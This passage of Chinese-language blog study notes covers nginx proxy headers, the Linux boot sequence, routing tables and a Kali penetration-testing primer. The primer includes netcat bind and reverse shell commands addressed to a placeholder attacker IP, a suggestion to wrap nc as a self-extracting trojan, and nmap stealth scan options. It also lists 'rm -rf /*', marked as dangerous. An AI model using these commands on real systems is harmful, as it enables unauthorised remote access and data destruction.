<span class="attribute">proxy_set_header</span> Host              $host;</span><br><span class="line">  <span class="attribute">proxy_set_header</span> X-Real-IP         $remote_addr;</span><br><span class="line">  <span class="attribute">proxy_set_header</span> X-Forwarded-For   $proxy_add_x_forwarded_for;</span><br><span class="line">  <span class="attribute">proxy_set_header</span> X-Forwarded-Proto $scheme;</span><br><span class="line">  <span class="attribute">proxy_set_header</span> X-Forwarded-Host  $host;</span><br><span class="line">  <span class="attribute">proxy_set_header</span> X-Forwarded-Port  $server_port;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>proxy_http_version 1.1</code>定义用于代理的HTTP协议版本，默认情况下将其设置为1.0。对于Websocket和<code>keepalive</code>连接，您需要使用1.1版。</p><p><code>proxy_cache_bypass $http_upgrade</code>设置websocket不从缓存中获取响应，而是直接通过应用。</p><p><code>Upgrade $http_upgrade</code>和<code>Connection &quot;upgrade&quot;</code>如果您的应用程序使用Websockets，则这些字段是必填字段。</p><p><code>X-Real-IP $remote_addr</code>将真实的客户端地址转发到应用，如果没有设置，你应用获取到将会是Nginx服务器IP地址。</p><p><code>X-Forwarded-For $proxy_add_x_forwarded_for</code>转发客户端请求头的<code>X-Forwarded-For</code>字段到应用。</p><p>如果客户端请求头中不存在<code>X-Forwarded-For</code>字段，则<code>$proxy_add_x_forwarded_for</code>变量等同于<code>$remote_addr</code>变量</p><p><code>X-Forwarded-Proto $scheme</code>这将会转发客户端所使用的HTTP协议或者是HTTPS协议。</p><p><code>X-Forwarded-Host $host</code>转发客户端请求的原始主机到应用。<code>X-Forwarded-Port $server_port</code>定义客户端请求的原始端口。</p><p>如果您没有现有的SSL/TLS证书，请使用Certbot获取免费的<code>Let’s Encrypt SSL</code>证书。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux启动过程</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/linux%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/linux%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="linux开机流程"><a href="#linux开机流程" class="headerlink" title="linux开机流程"></a>linux开机流程</h3><ol><li>开机BIOS自检，Base-Input-output-system找到启动设备</li><li>读取启动设备上的引导程序lilo或grub，如：硬盘指定位置，MBR分区（master-boot-record）主引导记录</li><li>grub引导Linux菜单（boot loader），忘记密码可在这步进入类win的安全模式</li><li>linux操作系统接管硬件，先读入/boot下内核文件，加载kernel内核</li><li>启动第一个程序（所以pid=1，其他所有进程都是其子进程），/sbin/init进程，初始化系统环境，根据/etc/inittab文件设定的运行级别</li><li>init进程，执行rc.sysinit（bash的一个脚本，是每个运行级别首先运行的脚本） 调用rcX/下的链接，找到init.d中的sh脚本，开启开机自启服务，即守护进程deamon(半人半神精灵)，在win中对应服务，rc.local在rcX脚本之后运行（有些没有rc.local）<ul><li>rc.sysinit作用：激活交换分区，检查磁盘，加载硬件模块以及其它一些需要优先执行任务</li><li>init.d/下的脚本一般能接受start、stop、restart、status</li><li>7个(runlevel)：</li><li>0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动</li><li>1：单用户工作状态，root权限，用于系统维护，禁止远程登陆</li><li>2：多用户状态(没有NFS)</li><li>3：完全的多用户状态(有NFS)，登陆后进入控制台命令行模式</li><li>4：系统未使用，保留</li><li>5：X11控制台，登陆后进入图形GUI模式</li><li>6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动</li><li>在每个运行级别中运行哪些守护进程，可通过chkconfig或者setup中的system services自行设定</li></ul></li><li>建立终端，rc执行完后，基本系统环境也设置结束，init会开启6个终端（inittab中的6行定义6个终端ttyx），登录，login shell<ul><li>命令行登录方式：init进程调用getty程序(get teletype)，用户输入用户名和密码后调用login程序，核对（debian会再多运行一个身份核对程序/etc/pam.d/login）密码正确则从/etc/passwd中读取该用户指定shell，启动。 默认的shell，bash会读入/etc/profile配置（该路径对所有用户有效）寻找以下三个用户配置文件，~/.bash_profile  ~/.bash_login ~/.profile 找到一个即可</li><li>ssh登录方式：init进程调用sshd，（debian加运行/etc/pam,d/ssh）取代getty和login，然后启动shell，bash配置文件读取同上</li><li>GUI登录方式：init进程调用显示管理器，Gnome图形界面对应的显示管理器为gdm（GNOME display manager），账户密码输入正确后，读取/etc/gdm3/Xsession，启动用户的会话。用户配置文件只加载/etc/profile 和 ~/.profile</li></ul></li></ol><h3 id="打开终端（non-login-shell）"><a href="#打开终端（non-login-shell）" class="headerlink" title="打开终端（non-login shell）"></a>打开终端（non-login shell）</h3><p>开机之后，用户经常手动打开的shell一般是non-login shell，该shell不读取/etc/profile 和 . profile等配置文件，但可以读取用户自己的配置文件~/.bashrc</p><ul><li>bash设置繁琐，阶段性载入，是历史原因，系统的通用设置放在 /etc/profile，用户个人的、需要被所有子进程继承的设置放在.profile，不需要被继承的设置放在.bashrc。</li><li>Mac OS X 使用的shell也是Bash。但是，它只加载.bash_profile，然后在.bash_profile里面调用.bashrc。而且，不管是ssh登录，还是在图形界面里启动shell窗口，都是如此。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核路由表</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Linux%E5%86%85%E6%A0%B8%E8%B7%AF%E7%94%B1%E8%A1%A8/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Linux%E5%86%85%E6%A0%B8%E8%B7%AF%E7%94%B1%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cyberciti.biz/faq/what-is-a-routing-table/">参考链接</a></p><h2 id="linux内核的路由表"><a href="#linux内核的路由表" class="headerlink" title="linux内核的路由表"></a>linux内核的路由表</h2><p>通过 <code>route</code> 命令查看 Linux 内核的路由表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_139_74_centos ~]# route</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">default         gateway         0.0.0.0         UG    0      0        0 eth0</span><br><span class="line">10.0.0.10       10.139.128.1    255.255.255.255 UGH   0      0        0 eth0</span><br><span class="line">10.139.128.0    0.0.0.0         255.255.224.0   U     0      0        0 eth0</span><br><span class="line">link-local      0.0.0.0         255.255.0.0     U     1002   0        0 eth0</span><br><span class="line">172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0</span><br><span class="line">172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-0ab63c131848</span><br><span class="line">172.19.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-bccbfb788da0</span><br><span class="line">172.20.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-7485db25f958</span><br><span class="line">[root@VM_139_74_centos ~]# route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">0.0.0.0         10.139.128.1    0.0.0.0         UG    0      0        0 eth0</span><br><span class="line">10.0.0.10       10.139.128.1    255.255.255.255 UGH   0      0        0 eth0</span><br><span class="line">10.139.128.0    0.0.0.0         255.255.224.0   U     0      0        0 eth0</span><br><span class="line">169.254.0.0     0.0.0.0         255.255.0.0     U     1002   0        0 eth0</span><br><span class="line">172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0</span><br><span class="line">172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-0ab63c131848</span><br><span class="line">172.19.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-bccbfb788da0</span><br><span class="line">172.20.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-7485db25f958</span><br></pre></td></tr></table></figure><p>各列字段说明：</p><table><thead><tr><th>列</th><th>含义</th></tr></thead><tbody><tr><td>Destination</td><td>目标网络或目标主机。Destination 为 default（<code>0.0.0.0</code>）时，表示这个是默认网关，所有数据都发到这个网关（这里是 <code>10.139.128.1</code>）</td></tr><tr><td>Gateway</td><td>网关地址，<code>0.0.0.0</code> 表示当前记录对应的 Destination 跟本机在同一个网段，通信时不需要经过网关</td></tr><tr><td>Genmask</td><td>Destination 字段的网络掩码，Destination 是主机时需要设置为 <code>255.255.255.255</code>，是默认路由时会设置为 <code>0.0.0.0</code></td></tr><tr><td>Flags</td><td>标记，含义参考表格后面的解释</td></tr><tr><td>Metric</td><td>路由距离，到达指定网络所需的中转数，是大型局域网和广域网设置所必需的 （不在Linux内核中使用。）</td></tr><tr><td>Ref</td><td>路由项引用次数 （不在Linux内核中使用。）</td></tr><tr><td>Use</td><td>此路由项被路由软件查找的次数</td></tr><tr><td>Iface</td><td>网卡名字，例如 <code>eth0</code></td></tr></tbody></table><p>Flags 含义：</p><ul><li>U 路由是活动的</li><li>H 目标是个主机</li><li>G 需要经过网关</li><li>R 恢复动态路由产生的表项</li><li>D 由路由的后台程序动态地安装</li><li>M 由路由的后台程序修改</li><li>! 拒绝路由</li></ul><h2 id="Linux-内核的路由种类"><a href="#Linux-内核的路由种类" class="headerlink" title="Linux 内核的路由种类"></a>Linux 内核的路由种类</h2><h3 id="主机路由"><a href="#主机路由" class="headerlink" title="主机路由"></a>主机路由</h3><p>路由表中指向单个 IP 地址或主机名的路由记录，其 Flags 字段为 H。下面示例中，对于 <code>10.0.0.10</code> 这个主机，通过网关 <code>10.139.128.1</code> 网关路由：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_139_74_centos ~]# route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">10.0.0.10       10.139.128.1    255.255.255.255 UGH   0      0        0 eth0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="网络路由"><a href="#网络路由" class="headerlink" title="网络路由"></a>网络路由</h3><p>主机可以到达的网络。下面示例中，对于 <code>10.0.0.0/24</code> 这个网络，通过网关 <code>10.139.128.1</code> 网关路由：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_139_74_centos ~]# route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">10.0.0.0        10.139.128.1    255.255.255.0   UG    0      0        0 eth0</span><br></pre></td></tr></table></figure><h3 id="默认路由"><a href="#默认路由" class="headerlink" title="默认路由"></a>默认路由</h3><p>当目标主机的 IP 地址或网络不在路由表中时，数据包就被发送到默认路由（默认网关）上。默认路由的 <code>Destination</code> 是 default 或 <code>0.0.0.0</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_139_74_centos ~]# route</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">default         gateway         0.0.0.0         UG    0      0        0 eth0</span><br></pre></td></tr></table></figure><h2 id="route-命令"><a href="#route-命令" class="headerlink" title="route 命令"></a>route 命令</h2><p>route 命令可以显示或设置 Linux 内核中的路由表，主要是静态路由。</p><p>对于局域网中的 Linux 主机，要想访问 Internet，需要将局域网的网关 IP 地址设置为这个主机的默认路由。在命令行中通过 <code>route</code> 命令添加的路由在网卡重启或机器重启后失效。可以在 <code>/etc/rc.local</code> 中添加 route 命令来保证路由设置永久有效。</p><p>选项:</p><ul><li><code>-A</code>：设置地址类型</li><li><code>-C</code>：打印 Linux 内核的路由缓存</li><li><code>-v</code>：显示详细信息</li><li><code>-n</code>：不执行 DNS 反向查找，直接显示数字形式的 IP 地址</li><li><code>-e</code>：netstat 格式显示路由表</li><li><code>-net</code>：到一个网络的路由表</li><li><code>-host</code>：到一个主机的路由表</li></ul><p>参数：</p><ul><li>add：增加路由记录</li><li>del：删除路由记录</li><li>target：目的网络或目的主机</li><li>gw：设置默认网关</li><li>mss：设置TCP的最大区块长度（MSS），单位MB</li><li>window：指定通过路由表的TCP连接的TCP窗口大小</li><li>dev：路由记录所表示的网络接口</li></ul><h3 id="添加路由-add"><a href="#添加路由-add" class="headerlink" title="添加路由 add"></a>添加路由 add</h3><p>可以添加一条可用路由，或添加一条要屏蔽的路由。</p><h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><h5 id="添加主机路由"><a href="#添加主机路由" class="headerlink" title="添加主机路由"></a>添加主机路由</h5><p>添加主机路由时，需要指定网络 ID 和主机 ID，此时需要设置 <code>netmask 255.255.255.255</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_139_74_centos ~]# route add -net 10.0.0.10 netmask 255.255.255.255 gw 10.139.128.1 dev eth0</span><br><span class="line">[root@VM_139_74_centos ~]# route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">10.0.0.10       10.139.128.1    255.255.255.255 UGH   0      0        0 eth0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="添加网络路由"><a href="#添加网络路由" class="headerlink" title="添加网络路由"></a>添加网络路由</h5><p>添加网络路由时，只需指定网络 ID，通过 <code>netmask</code> 设置掩码长度：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_139_74_centos ~]# route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.139.128.1 dev eth0</span><br><span class="line">[root@VM_139_74_centos ~]# route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">10.0.0.0        10.139.128.1    255.255.255.0   UG    0      0        0 eth0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="添加添加同一个局域网的主机"><a href="#添加添加同一个局域网的主机" class="headerlink" title="添加添加同一个局域网的主机"></a>添加添加同一个局域网的主机</h5><p>不指定 gw 选项时，添加的路由记录不使用网关：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_139_74_centos ~]# route add -net 224.0.0.0 netmask 240.0.0.0 dev eth0</span><br><span class="line">[root@VM_139_74_centos ~]# route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">224.0.0.0       0.0.0.0         240.0.0.0       U     0      0        0 eth0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="屏蔽路由"><a href="#屏蔽路由" class="headerlink" title="屏蔽路由"></a>屏蔽路由</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_139_74_centos ~]# route add -net 224.0.0.0 netmask 240.0.0.0 reject</span><br><span class="line">[root@VM_139_74_centos ~]# route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">224.0.0.0       -               240.0.0.0       !     0      -        0 -</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="删除路由记录"><a href="#删除路由记录" class="headerlink" title="删除路由记录"></a>删除路由记录</h3><p>跟添加路由类似，可以删除一条可用路由，或删除一条屏蔽的路由。</p><h4 id="删除可用路由"><a href="#删除可用路由" class="headerlink" title="删除可用路由"></a>删除可用路由</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route del -net 224.0.0.0 netmask 240.0.0.0</span><br></pre></td></tr></table></figure><h4 id="删除屏蔽的路由"><a href="#删除屏蔽的路由" class="headerlink" title="删除屏蔽的路由"></a>删除屏蔽的路由</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route del -net 224.0.0.0 netmask 240.0.0.0 reject</span><br></pre></td></tr></table></figure><h3 id="删除和添加设置默认网关"><a href="#删除和添加设置默认网关" class="headerlink" title="删除和添加设置默认网关"></a>删除和添加设置默认网关</h3><p>添加或删除默认网关时，Linux 会自动检查网关的可用性：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_139_74_centos ~]# route add default gw 192.168.1.1</span><br><span class="line">SIOCADDRT: Network is unreachable</span><br><span class="line">[root@VM_139_74_centos ~]# route del default gw 192.168.1.1</span><br><span class="line">SIOCDELRT: No such process</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> route </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali完全攻略</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kali%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kali%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="Kali基础"><a href="#Kali基础" class="headerlink" title="Kali基础"></a>Kali基础</h2><p>工具不是主力，脑子才是主力</p><p>用编程语言自己写工具，而不是当脚本小子</p><hr><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Linux安装不像windows，可以直接使用iso启用，对应linux安装有两种启动方式，install与live：</p><p><strong>install：</strong>其实就是装到电脑中，好处包括可以存储东西到电脑中，方便升级等，坏处是方便被人取证。</p><p><strong>live：</strong>linux是轻量级系统，可以直接放在u盘中启动，利用光盘镜像文件进行live方式启动，一切行为存储在内存中（断电消失，难以取证）如果要额外存储东西，需要另外存到u盘中。     （tips：打造手机kali）</p><p><strong>vps部署kali</strong>：<a href="http://old.kali.org/">http://old.kali.org</a> 可用sha256校验，cmd自带命令certutil -hashfile 文件名 md5 sha256等</p><p>Kali从2020开始不支持root为基本账户，所以root密码原先的toor密码不再可以登录进去，每次只能以普通用户kali登录，权限少到连基本的reboot，shutdown都无，进入单例模式修改root密码，默认无具体见 <a href="https://www.cnblogs.com/ph1sh/p/12241482.html">https://www.cnblogs.com/ph1sh/p/12241482.html</a>  </p><blockquote><p>步骤：</p><p>重启，5秒内按E，光标向下移到linux开头行，下一行的ro改为rw，再移到该行最后写<strong>init=/bin/bash</strong>，确保最后是rw quiet splash init=/bin/bash</p><p>ctrl+c进入单例模式，<strong>passwd root</strong>输入两次新密码即可</p></blockquote><p>kali2020版本之后，用户名与密码默认kali，之前，默认用户名root，密码toor</p><hr><h3 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h3><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><p>$普通用户权限，#root权限，机器与人类可用最高权限</p><p>sudo提权命令，默认2020以上没有密码</p><p>kali自带的是火狐内核浏览器</p><p>ifconfig 查看ip地址</p><p>pwd查看当前路径</p><p>cd .. 退一格，linux中，/是最上层目录</p><p>ls查看当前目录</p><p>ls -la查看当前目录详细信息</p><p>d    rwx    r-w    r-x    13    root    root    0    Nov    3    11:22    sys</p><p>d文件夹</p><p>.和..是默认都有的目录，每个文件夹中都有；</p><p>-文件；</p><p>l链接(类似快捷方式)</p><p>r = read = 4；w = write = 2；x = execute = 1，755就是上面的3种权限，第一个权限是所有者权限，第二个权限=所有者所在组的权限，跟所有者在同一个组的其他人的权限，第三个权限=其他人权限</p><p>第一个root位置，文件的所有者是root，第二个root位置：这个文件的所有者所在的组是什么组；</p><p>最后sys位置=文件名</p><p>rwxr–r-x：745</p><p>mkdir test 新建文件夹，文件名是test</p><p>touch 1.txt 新建文件1.txt</p><p>vi 1.txt 使用vi编辑器去编辑1.txt</p><p>vi是一个命令行编辑器，按下i进入insert模式</p><p>esc（按下esc进入命令行）：wq 保存退出 ：q！不保存退出</p><p>cat 1.txt 看一下里面的内容；tac 1.txt 从后向前看内容</p><p>cp 【被复制的文件】 【复制到的位置】 复制</p><p>mv 【被剪切的文件】 【粘贴到的位置】剪切/改名 如果两个位置都是文件名，相当于把第一个文件改为第二个文件名</p><p>rm 【目标】删除</p><p>rm -rf 【目标】强行删除文件夹和其中的文件并不询问</p><p>rm -rf /* 危险命令，这里/表示根目录，*表示所有</p><p>find【在哪个地方查找】 -name【要查找的文件名】 找东西</p><p>find ./ -name test，这里./表示当前目录下，find / -name 1.txt相当于在/根目录下寻找，即全局搜索</p><p>ps 查看进程，查看当前普通进程</p><p>ps-ef 查看所有进程</p><p>top查看动态进程，ctrl+c结束</p><p>ps -ef | grep [条件] 筛选符合条件的进程</p><p>ps -ef | grep bash 在所有进程中查看名字叫bash的</p><p>| = 管道符，把左边的命令执行结果传给后面</p><p>echo 回显</p><p>echo haha &gt; 1.txt 在1.txt中覆盖写入haha</p><p>echo haha &gt;&gt;1.txt 在1.txt中换行追加内容</p><p>uname 查看操作系统  -a详细信息</p><p>chmod [权限的数字] [目标文件]  修改权限</p><p>chmod 755 -R [文件夹] 修改文件夹内所有东西的权限</p><h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><p>linux系统中防火墙是iptables</p><p>考虑版本差异</p><p>service iptables start/stop</p><p>永久关闭  chkconfig iptable on/off</p><p>passwd 修改密码</p><h3 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h3><p>bitvise软件好用</p><p>vi /etc/ssh/sshd_config    修改ssh的配置文件，这里是sshd文件</p><ul><li><p>去掉port 22之前的注释号#</p></li><li><p>permitrootlogin取消注释 同时改为yes</p></li><li><p>pubkeyauthentication yes</p></li></ul><p>修改之后esc退到命令模式，用 :wq!退出，2020后版本默认无root权限，见上面安装部分修改root密码登录账户</p><p><strong>新版</strong>（ubuntu15,centos7之后）linux用 systemctl restart ssh/sshd 重启ssh  重启后netstat -tplugn查看22号端口已开放</p><p><strong>旧版</strong>：/etc/init.d/ssh restart    （这是指定目录下的某个文件重启，不是到该目录下用ssh restart  </p><p>kali106版本默认ssh已配置好，用etc/init.d/ssh start启动</p><p>之后使用bitvise连接（这才是正经操作）</p><p>关闭kali： shutdown -h now</p><h3 id="修改更新源"><a href="#修改更新源" class="headerlink" title="修改更新源"></a>修改更新源</h3><p>linux去哪下载包？</p><p>apt-get install beef   linux是最早产生应用商店的概念的地方，apt可以理解为应用商店，从此处get，然后install一个叫beef的软件</p><p>/etc/apt/sources.list   更新源，可以调整为aliyun的</p><p>更新源之后需要 apt-get update 对系统进行更新，重新更改更新源</p><p>一般2019之后的kali没有beef软件，安装apt-get install beef-xss</p><hr><h3 id="nc-netcat"><a href="#nc-netcat" class="headerlink" title="nc(netcat)"></a>nc(netcat)</h3><p>微软觉得cmd的权限和可以做的事情太少了，于是有了powershell，hacker最终目标是控制目标电脑的cmd/powershell</p><p>在linux世界，使用什么控制win的命令行？</p><p>nc（瑞士军刀，短小精悍）开源，跨平台，kali自带，kali也有netcat</p><p>功能丰富，远程通信，控制，加密通信，配合自解压还可以变成小马等操作</p><h4 id="发送普通文字"><a href="#发送普通文字" class="headerlink" title="发送普通文字"></a>发送普通文字</h4><p>服务端（被黑的）：</p><p>nc .exe -l -p 4444   监听从4444端口走的信息</p><p>客户端：</p><p>nc -nv [服务端ip] 4444</p><blockquote><p>win10 无法访问问题</p><p>尝试更新版本，nc2019的应该可以在win7上，win10无法访问。</p><p>暂时没找到新的，原来是360不给访问，关了360就行，可以尝试自己写一个nc</p><p>关于nc的其他使用方法 <a href="https://blog.csdn.net/earbao/article/details/49633789">https://blog.csdn.net/earbao/article/details/49633789</a></p></blockquote><h4 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h4><p>正向连接：比如黑客主动连接目标主机，</p><p>目标主机： nc -lp 3333 -e cmd  如果有人连接我3333端口，就把cmd返还给这个人，这里-lp相当于-l -p的混合写法，l=listen，p=port，e=执行什么</p><p>hacker：nc -nv [目标ip] 3333</p><p>反向连接：目标主机主动去连接黑客，比如域名，木马主动去找黑客</p><p>hacker： nc -lp 3333</p><p>目标主机： nc -nv [hacker ip] 3333 -e cmd</p><p>如果是linux，就是 -e bash，不是-e cmd</p><p>（将nc做成自解压文件，改造，使用自解压文件执行cmd命令，其实就是一个小远控）</p><h3 id="OS外的信息搜集"><a href="#OS外的信息搜集" class="headerlink" title="OS外的信息搜集"></a>OS外的信息搜集</h3><h4 id="扫描器nmap"><a href="#扫描器nmap" class="headerlink" title="扫描器nmap"></a>扫描器nmap</h4><p>全世界最厉害的扫描器？</p><blockquote><p>内网主机发现，</p><p>端口扫描（端口上一般对应什么服务，不同服务版本可能存在不同漏洞），</p><p>版本侦测，</p><p>OS指纹识别（不同版本OS补丁的入侵方式不同）</p></blockquote><p><strong>nmap [目标ip] 普通扫描（Tcp）</strong>  <strong>135</strong>（135端口就是用于远程的打开对方的telnet服务，用于启动与远程计算机的RPC 连接，很容易就可以就侵入电脑。大名鼎鼎的“冲击波”就是利用135端口侵入的。 ）和<strong>445</strong>（445端口是一种TCP端口，该端口在windows 2000 Server或Windows Server 2003系统中发挥的作用与139端口是完全相同的。 具体地说，它可以提供局域网中文件或打印机共享服务。 … 同样地，攻击者与445端口建立请求连接，也能获得指定局域网内的各种共享信息。）端口比较忌讳，在内网的话可以直接干掉</p><p><strong>nmap 192.168.1.0/24</strong> 或者192.168.1**.1-255**  扫描范围为192.168.1.1~192.168.1.255这个范围内所有</p><p><strong>-sT</strong>  <strong>tcp端口扫描</strong>， 普通扫描（<strong>默认</strong>）但是该方法很容易被防火墙识别，因为这是基于tcp的3次握手4次挥手的，扫描目标主机开放了哪些端口</p><p><strong>-sS</strong> <strong>隐秘扫描</strong>（不形成三次握手，不建立tcp连接）在目标主机上留下不多的日志信息</p><p><strong>-sU</strong> 使用<strong>udp扫描</strong> 很多时候tcp对于防火墙很敏感，容易被发现，但是udp不可靠协议</p><p><strong>-PU</strong> 同上，使用UDP扫描，nmap会发送一个空的报文到主机，若是返回则说明设备在线。一般咱们只须要添加-PU便可实现udp扫描。</p><hr><p><strong>-sL</strong> 192.168.1.1-255  使用list scan<strong>扫描整个网段</strong>，主要用于主机发现（实测可被摄像头屏蔽）</p><p><strong>-p [指定端口]</strong> 如 nmap -p 100-200,3306 192.168.1.252</p><p><strong>-sn</strong> ping scan（ping扫描），<strong>只发现</strong>主机，<strong>不扫描端口</strong>，有时候上面扫描命令会引起怀疑，但是用ping可能不会引起怀疑，有时候ping不一定准，当网络卡的时候。阻止ping的方式，在防火墙上把ping功能禁用掉就可以装死了（实测可看到海康威视摄像头，honor疑似屏蔽此项）</p><p><strong>-Pn</strong> 假定所有主机都是开机的，<strong>跳过发现</strong>过程。有的防火墙设计公司在侦测到被扫描的阶段就把威胁干掉，所以避免被发现很重要</p><p> <strong>-sP</strong> 172.16.88.0/24 <strong>Ping扫描</strong>172.16.88.0/24网段上有哪些主机是存活的</p><p><strong>-P0</strong> 使用ip探测协议探测主机是否开启，<strong>无ping扫描</strong>，ping扫描虽然简单，可是当开启了禁ping后，以上方法便行不通了。这时咱们即可以用无ping扫描。</p><p><strong>-PR</strong> ARP扫描，ARP扫描是nmap对目标进行一个<strong>apr ping扫描</strong>的过程，尤为在内网的状况下。由于在本地局域网防火墙是不会禁止ARP请求的。因此在内网中使用apr扫描时很是有效的。</p><p><strong>-O</strong> 识别操作系统，根据OS指纹猜OS是啥</p><p>其中os <strong>cpe</strong>显示的是nmap<strong>猜测</strong>的系统</p><blockquote><p>维基百科扩展</p><ul><li>全面进攻性扫描（包括各种主机发现、端口扫描、版本扫描、OS扫描及默认脚本扫描）:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v 